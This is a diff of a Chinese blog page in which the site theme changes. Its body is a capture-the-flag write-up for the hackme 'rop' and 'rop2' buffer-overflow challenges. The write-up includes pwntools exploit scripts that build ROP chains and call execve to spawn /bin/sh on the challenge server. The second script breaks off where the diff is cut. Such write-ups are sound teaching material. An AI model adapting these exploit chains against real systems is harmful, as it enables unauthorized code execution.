@@ -1,1035 +1,530 @@
 <!DOCTYPE html>
+<html lang="zh-Hans">
 
 
 
 
 
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=7.1.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.1.0',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="description" content="zs0zrc&#39;s blog">
+  <meta name="author" content="zs0zrc">
+  <meta name="keywords" content="pwn CTF security anythings">
+  <title>rop 和 rop2 writeup - zs0zrc</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
 
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-  <meta name="description" content="题目来源：国外的一个ctf平台hackme  rophint: ROP buffer overflow防护机制：  拖到IDA反编译一下   可以看到有很多函数 ，不管是用到的还是没用的都有，说明它编译时用的是静态连接我们可以通过ROPgadget 来直接构造ropchain命令为 ROPgadget –binary rop –ropchain 栈的大小可以通过peda的pattern searc">
-<meta name="keywords" content="writeup,pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="rop 和 rop2 writeup">
-<meta property="og:url" content="http://yoursite.com/2018/05/09/2018-5-9-rop-和-rop2-writeup/index.html">
-<meta property="og:site_name" content="zs0zrc">
-<meta property="og:description" content="题目来源：国外的一个ctf平台hackme  rophint: ROP buffer overflow防护机制：  拖到IDA反编译一下   可以看到有很多函数 ，不管是用到的还是没用的都有，说明它编译时用的是静态连接我们可以通过ROPgadget 来直接构造ropchain命令为 ROPgadget –binary rop –ropchain 栈的大小可以通过peda的pattern searc">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-200594bf2588e53c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-7f78da80c9864015.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-df5b8953cdf34182.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-81fcc72ec9b6a7d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-a52ff683d95affe9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-01-02T07:49:14.443Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="rop 和 rop2 writeup">
-<meta name="twitter:description" content="题目来源：国外的一个ctf平台hackme  rophint: ROP buffer overflow防护机制：  拖到IDA反编译一下   可以看到有很多函数 ，不管是用到的还是没用的都有，说明它编译时用的是静态连接我们可以通过ROPgadget 来直接构造ropchain命令为 ROPgadget –binary rop –ropchain 栈的大小可以通过peda的pattern searc">
-<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/8390991-200594bf2588e53c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
 
 
+<!-- 自定义样式保持在最底部 -->
 
-
-
-  
-  
-  <link rel="canonical" href="http://yoursite.com/2018/05/09/2018-5-9-rop-和-rop2-writeup/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>rop 和 rop2 writeup | zs0zrc</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
-  
-  
-    
-  
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>
 
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">zs0zrc</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-
-  
 </nav>
 
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/zszcr" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/09/2018-5-9-rop-和-rop2-writeup/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="zs0zrc">
-      <meta itemprop="description" content="zs0zrc's blog">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zs0zrc">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">rop 和 rop2 writeup
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-05-09 20:00:05" itemprop="dateCreated datePublished" datetime="2018-05-09T20:00:05+08:00">2018-05-09</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-01-02 15:49:14" itemprop="dateModified" datetime="2019-01-02T15:49:14+08:00">2019-01-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/hackme-inndy-writeup/" itemprop="url" rel="index"><span itemprop="name">hackme.inndy_writeup</span></a></span>
-
-                
-                
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
               
             </span>
-          
 
-          
             
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Wednesday, May 9th 2018, 8:00 pm
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    760 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      4 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
             
-          
+          </div>
 
           
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <p>题目来源：国外的一个ctf平台<a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">hackme</a> </p>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>题目来源：国外的一个ctf平台<a href="https://hackme.inndy.tw/" target="_blank" rel="noopener">hackme</a> </p>
 <h3 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h3><p>hint: ROP buffer overflow<br>防护机制：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-200594bf2588e53c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-200594bf2588e53c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"></p>
 <p>拖到IDA反编译一下 </p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-7f78da80c9864015.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-7f78da80c9864015.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"></p>
 <p>可以看到有很多函数 ，不管是用到的还是没用的都有，说明它编译时用的是静态连接<br>我们可以通过ROPgadget 来直接构造ropchain<br>命令为 ROPgadget –binary rop –ropchain</p>
 <p>栈的大小可以通过peda的pattern search 来找到<br>先生成 长度为100的字符串  pattern create 100<br>然后执行程序</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-df5b8953cdf34182.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p>栈的大小为12<br>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack  </span><br><span class="line">sh = remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7704</span>)  </span><br><span class="line">junk = <span class="string">'a'</span>*<span class="number">12</span> + <span class="string">"BBBB"</span> <span class="comment"># junk + ebp  </span></span><br><span class="line">  </span><br><span class="line">p = junk  </span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret  </span></span><br><span class="line">p += <span class="string">'/bin'</span>  </span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8016</span>) <span class="comment"># pop eax ; ret  </span></span><br><span class="line">p += <span class="string">'//sh'</span>  </span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0805466b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080de769</span>) <span class="comment"># pop ecx ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806ecda</span>) <span class="comment"># pop edx ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080492d3</span>) <span class="comment"># xor eax, eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807a66f</span>) <span class="comment"># inc eax ; ret  </span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806c943</span>) <span class="comment"># int 0x80  </span></span><br><span class="line">  </span><br><span class="line">sh.sendline(p)  </span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-df5b8953cdf34182.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"></p>
+<p>栈的大小为12<br>exp:</p>
+<pre><code class="python">from pwn import *  
+from struct import pack  
+sh = remote(&#39;hackme.inndy.tw&#39;,7704)  
+junk = &#39;a&#39;*12 + &quot;BBBB&quot; # junk + ebp  
+
+p = junk  
+p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret  
+p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data  
+p += pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret  
+p += &#39;/bin&#39;  
+p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret  
+p += pack(&#39;&lt;I&#39;, 0x080ea064) # @ .data + 4  
+p += pack(&#39;&lt;I&#39;, 0x080b8016) # pop eax ; ret  
+p += &#39;//sh&#39;  
+p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret  
+p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8  
+p += pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0805466b) # mov dword ptr [edx], eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret  
+p += pack(&#39;&lt;I&#39;, 0x080ea060) # @ .data  
+p += pack(&#39;&lt;I&#39;, 0x080de769) # pop ecx ; ret  
+p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8  
+p += pack(&#39;&lt;I&#39;, 0x0806ecda) # pop edx ; ret  
+p += pack(&#39;&lt;I&#39;, 0x080ea068) # @ .data + 8  
+p += pack(&#39;&lt;I&#39;, 0x080492d3) # xor eax, eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0807a66f) # inc eax ; ret  
+p += pack(&#39;&lt;I&#39;, 0x0806c943) # int 0x80  
+
+sh.sendline(p)  
+sh.interactive()  
+</code></pre>
 <h3 id="rop2"><a href="#rop2" class="headerlink" title="rop2"></a>rop2</h3><p>hint：ROPgadget not  working anymore<br>说明不可以再通过ROPgadget来获取ropchain了<br>检查下防护机制 只开启了NX</p>
 <p>简单运行了一下程序：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-81fcc72ec9b6a7d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-81fcc72ec9b6a7d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"></p>
 <p>程序要求你输入一串字符串 然后打印出了一堆东西</p>
 <p>将程序拖到ida中，来一手f5大法</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-a52ff683d95affe9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-a52ff683d95affe9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"></p>
 <p>发现了syscall函数 ，查了一下发现程序中的syscall(4,1,&amp;v4,42) 和syscall(3,0,&amp;v1,1024) 分别调用了write()函数和read函数的系统调用</p>
 <p>解题思路：<br>将syscall中的第一个参数设置为execve()函数的调用号，第二个</p>
 <p>参数设置为“/bin/sh”参数的地址 来执行execve()获取shell</p>
 <p>execve()函数的系统调用号 为0xb</p>
-<p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*  </span><br><span class="line">p = remote(<span class="string">'hackme.inndy.tw'</span>,<span class="number">7703</span>)  </span><br><span class="line">elf = ELF(<span class="string">'./rop2'</span>)  </span><br><span class="line">bss = elf.bss()  </span><br><span class="line">syscall = elf.symbols[<span class="string">'syscall'</span>]  </span><br><span class="line">overflow = elf.symbols[<span class="string">'overflow'</span>]   </span><br><span class="line">  </span><br><span class="line">p.recv()  </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0xC</span> + <span class="string">'bbbb'</span> + p32(syscall) + p32(overflow) <span class="comment"># junk + target_address  + return_address  </span></span><br><span class="line">payload += p32(<span class="number">3</span>) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">8</span>) <span class="comment">#syscall(3,0,bss_add,8)  </span></span><br><span class="line">p.send(payload)  </span><br><span class="line">p.send(<span class="string">"/bin/sh\x00"</span>)  </span><br><span class="line">  </span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0xc</span> + <span class="string">"BBBB"</span> + p32(syscall)  </span><br><span class="line">payload1 += p32(overflow)+ p32(<span class="number">0xb</span>) + p32(bss) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>)  <span class="comment">#syscall(0xb,bss_add,0,0) = execve("bin/sh",0,0)  </span></span><br><span class="line">  </span><br><span class="line">p.send(payload1)  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>exp:</p>
+<pre><code class="python">from pwn import*  
+p = remote(&#39;hackme.inndy.tw&#39;,7703)  
+elf = ELF(&#39;./rop2&#39;)  
+bss = elf.bss()  
+syscall = elf.symbols[&#39;syscall&#39;]  
+overflow = elf.symbols[&#39;overflow&#39;]   
 
-      
-    </div>
+p.recv()  
+payload = &#39;a&#39;*0xC + &#39;bbbb&#39; + p32(syscall) + p32(overflow) # junk + target_address  + return_address  
+payload += p32(3) + p32(0) + p32(bss) + p32(8) #syscall(3,0,bss_add,8)  
+p.send(payload)  
